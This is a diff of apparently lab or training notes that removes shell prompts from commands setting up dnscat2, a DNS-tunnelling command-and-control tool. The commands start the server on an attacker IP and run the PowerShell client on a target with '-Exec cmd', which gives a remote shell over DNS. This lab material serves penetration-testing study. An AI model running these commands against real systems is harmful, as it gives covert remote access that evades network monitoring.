@@ -898,15 +898,15 @@ xfreerdp /u:<username> /p:<password> /v:10.129.15.150:8080
 
 ### 1. Clone and Set Up the Server  
 ```bash
-$ git clone https://github.com/iagox86/dnscat2.git
-$ cd dnscat2/server/
-$ sudo gem install bundler
-$ sudo bundle install
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
 ```
 
 ### 2. Start the dnscat2 Server  
 ```bash
-$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 ```
 - **host**: Attacker’s IP.  
 - **port**: DNS port (53).  
@@ -914,7 +914,7 @@ $ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local
 
 ### 3. Clone dnscat2-powershell for the Client  
 ```bash
-$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 Transfer the `dnscat2.ps1` file to the target (Host B).
 
@@ -924,12 +924,12 @@ Transfer the `dnscat2.ps1` file to the target (Host B).
 
 ### 1. Import dnscat2 PowerShell Module  
 ```powershell
-PS C:\htb> Import-Module .\dnscat2.ps1
+Import-Module .\dnscat2.ps1
 ```
 
 ### 2. Start the Client  
 ```powershell
-PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 ```
 - **DNSserver**: Attacker’s IP.  
 - **Domain**: Fake domain used by the server.  
@@ -950,6 +950,6 @@ Session 1 Security: ENCRYPTED AND VERIFIED!
 ## Interacting with a Session  
 ### Switch to the Established Session  
 ```plaintext
-dnscat2> window -i 1
+window -i 1
 ```
 
